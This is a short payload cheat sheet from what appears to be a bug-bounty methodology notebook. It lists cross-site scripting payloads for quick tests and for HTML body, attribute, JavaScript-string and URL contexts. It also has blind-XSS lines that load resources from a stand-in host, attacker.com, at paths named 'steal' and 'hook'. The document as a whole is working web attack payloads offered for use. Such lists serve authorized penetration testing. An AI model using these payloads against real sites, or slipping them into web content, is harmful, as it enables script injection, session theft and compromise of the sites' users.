> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/payloads/00-index|← Back to Payloads]] · Related: [[04-xss|XSS playbook]]

# XSS Payloads

## Quick Test

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Context-Specific

- HTML body: `<script>alert(1)</script>`
- HTML attribute: `" onfocus=alert(1) autofocus "`
- JS string: `');alert(1);//`
- URL: `javascript:alert(1)`

## Blind XSS

```html
<img src="http://attacker.com/steal">
<script src="http://attacker.com/hook"></script>
```

→ See full methodology: [[blind-xss-methodology|Blind XSS Methodology]]
